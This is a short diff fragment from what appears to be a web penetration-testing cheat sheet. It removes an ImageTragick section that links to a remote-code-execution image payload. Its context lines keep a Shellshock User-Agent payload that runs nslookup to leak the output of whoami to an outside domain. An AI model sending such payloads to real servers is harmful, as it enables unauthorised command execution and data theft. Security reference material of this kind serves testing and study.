@@ -1685,9 +1685,6 @@ https://github.com/rodolfomarianocy/hackshell
 ```
 User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com
 ```
-### ImageTragik
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
-
 ## Third-party Software, ITSM, ITSO, ITBM
 ### Jira
 -> Check privileges in:  
